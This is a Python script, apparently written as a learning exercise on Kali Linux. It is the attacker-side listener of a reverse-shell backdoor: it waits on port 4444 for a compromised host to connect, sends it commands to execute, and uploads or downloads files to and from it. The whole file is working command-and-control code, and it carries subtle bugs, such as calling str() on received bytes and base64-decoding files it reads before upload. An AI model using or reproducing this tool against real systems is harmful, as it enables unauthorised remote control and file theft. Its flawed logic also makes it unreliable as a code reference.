#!/usr/bin/python

# in the kali linux machine

import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        # create socket object
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # modify a socket option to reuse sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # listen incoming connection
        listener.bind((ip, port))
        # backlog (number of connection that can be cured before the system starts refusing
        listener.listen(0)
        print("[+] waiting for incoming connection")
        # accept the connection
        # self.connection to reuse
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    # DATA TCP NOT FULLY RECEIVED
    # Solution : mesure THE SIZE OF THE MESSAGE (in a box)
    # use json (java script object notation) : represent object as text
    # json use when transferring data between client and server
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.connection.recv(1024)

    # download
    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."

    # upload (opposite of download)
    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            # decode utf8 .....
            return base64.b64decode(file.read())

    def run(self):
        while True:
            command = input(">> ")  # raw_input python 2
            command = command.split(" ")

            # try except enable in python 2 to keep the connection even if the commands are incorrect
            # try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(str(file_content))

            result = self.execute_remotely(command)

            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            # except Exception:
                # result = "[-] Error during command execution"
            print(result)


my_listener = Listener("10.0.2.16", 4444)
my_listener.run()
